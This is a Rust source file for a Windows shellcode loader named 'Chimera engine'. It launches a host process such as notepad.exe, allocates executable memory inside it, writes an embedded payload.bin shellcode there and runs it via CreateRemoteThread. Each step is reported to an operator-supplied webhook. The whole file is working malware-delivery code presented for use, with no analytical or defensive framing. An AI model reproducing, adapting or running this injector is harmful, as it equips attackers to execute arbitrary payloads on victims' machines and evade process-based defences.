#![allow(non_camel_case_types)]
#![allow(unused)]

use std::env;
use std::ffi::c_void;
use std::mem;
use std::ptr;
use std::thread;

type HANDLE = *mut c_void;
type LPVOID = *mut c_void;
type LPTHREAD_START_ROUTINE = unsafe extern "system" fn(lp_thread_parameter: LPVOID) -> u32;

#[repr(C)]
pub struct PROCESS_INFORMATION {
    pub h_process: HANDLE,
    pub h_thread: HANDLE,
    pub dw_process_id: u32,
    pub dw_thread_id: u32,
}

#[repr(C)]
pub struct STARTUPINFOA {
    pub cb: u32,
    pub lp_reserved: *mut u8,
    pub lp_desktop: *mut u8,
    pub lp_title: *mut u8,
    pub dw_x: u32,
    pub dw_y: u32,
    pub dw_x_size: u32,
    pub dw_y_size: u32,
    pub dw_x_count_chars: u32,
    pub dw_y_count_chars: u32,
    pub dw_fill_attribute: u32,
    pub dw_flags: u32,
    pub w_show_window: u16,
    pub cb_reserved2: u16,
    pub lp_reserved2: *mut u8,
    pub h_std_input: HANDLE,
    pub h_std_output: HANDLE,
    pub h_std_error: HANDLE,
}

unsafe extern "system" {
    fn CreateProcessA(app: *const u8, cmd: *mut u8, pa: LPVOID, ta: LPVOID, inh: i32, flags: u32, env: LPVOID, dir: *const u8, si: *mut STARTUPINFOA, pi: *mut PROCESS_INFORMATION) -> i32;
    fn VirtualAllocEx(h: HANDLE, addr: LPVOID, sz: usize, typ: u32, prot: u32) -> LPVOID;
    fn WriteProcessMemory(h: HANDLE, base: LPVOID, buf: *const c_void, sz: usize, out: *mut usize) -> i32;
    fn CreateRemoteThread(h: HANDLE, attr: LPVOID, stack: usize, start: LPTHREAD_START_ROUTINE, param: LPVOID, flags: u32, id: *mut u32) -> HANDLE;
    fn CloseHandle(obj: HANDLE) -> i32;
    fn GetLastError() -> u32;
}

const MEM_COMMIT_RESERVE: u32 = 0x3000;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;

pub struct ChimeraConfig {
    pub webhook: Option<String>,
    pub target_process: String,
}

fn log_status(message: &str, webhook_url: &Option<String>) {
    println!("{}", message);
    if let Some(url) = webhook_url {
        let url_clone = url.clone();
        let msg_clone = message.to_string();
        let payload = format!(r#"{{"content": "{}"}}"#, msg_clone);
        let _ = thread::spawn(move || {
            let _ = ureq::post(&url_clone)
                .set("Content-Type", "application/json")
                .send_string(&payload);
        });
    }
}

pub fn chimera_remote_thread_injection(shellcode: &[u8], config: &ChimeraConfig) {
    log_status("[CHIMERA][i] Initializing Remote Thread Injection...", &config.webhook);

    let mut si: STARTUPINFOA = unsafe { mem::zeroed() };
    si.cb = mem::size_of::<STARTUPINFOA>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { mem::zeroed() };
    
    let target_path = format!("{}\0", config.target_process);

    let success = unsafe { 
        CreateProcessA(target_path.as_ptr(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), 
                       0, 0, ptr::null_mut(), ptr::null_mut(), &mut si, &mut pi) 
    };

    if success == 0 { 
        log_status(&format!("[CHIMERA][!] CreateProcessA failed. Error: {}", unsafe { GetLastError() }), &config.webhook);
        return; 
    }
    log_status(&format!("[CHIMERA][+] Host Process Created: {} (PID: {})", config.target_process, pi.dw_process_id), &config.webhook);

    let remote_mem = unsafe { 
        VirtualAllocEx(pi.h_process, ptr::null_mut(), shellcode.len(), 
                       MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE) 
    };

    if remote_mem.is_null() {
        log_status("[CHIMERA][!] Remote allocation failed.", &config.webhook);
        return;
    }

    let mut bytes_written = 0;
    unsafe { 
        WriteProcessMemory(pi.h_process, remote_mem, shellcode.as_ptr() as _, 
                           shellcode.len(), &mut bytes_written); 
    }
    log_status(&format!("[CHIMERA][+] Wrote {} bytes to host memory.", bytes_written), &config.webhook);

    unsafe {
        let thread_handle = CreateRemoteThread(
            pi.h_process,
            ptr::null_mut(),
            0,
            mem::transmute(remote_mem),
            ptr::null_mut(),
            0,
            ptr::null_mut()
        );

        if thread_handle.is_null() {
            log_status(&format!("[CHIMERA][!] CreateRemoteThread failed. Error: {}", GetLastError()), &config.webhook);
        } else {
            log_status("[CHIMERA][*] Remote thread created successfully.", &config.webhook);
            CloseHandle(thread_handle);
        }

        CloseHandle(pi.h_process);
        CloseHandle(pi.h_thread);
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    
    let mut target_process = option_env!("CHIMERA_TARGET")
        .unwrap_or("C:\\Windows\\System32\\notepad.exe")
        .to_string();

    let mut webhook_url = option_env!("CHIMERA_WEBHOOK").map(|s| s.to_string());

    for i in 1..args.len() {
        match args[i].as_str() {
            "--webhook" => {
                if i + 1 < args.len() { webhook_url = Some(args[i + 1].clone()); }
            }
            "--target-process" => {
                if i + 1 < args.len() { target_process = args[i + 1].clone(); }
            }
            _ => {}
        }
    }

    let config = ChimeraConfig {
        webhook: webhook_url,
        target_process,
    };

    let arch = if cfg!(target_arch = "x86_64") { "64-BIT" } else { "32-BIT" };
    log_status(&format!("--- CHIMERA ENGINE (REMOTE THREAD): {} MODE ---", arch), &config.webhook);

    let shellcode = include_bytes!("payload.bin");
    chimera_remote_thread_injection(shellcode, &config);
}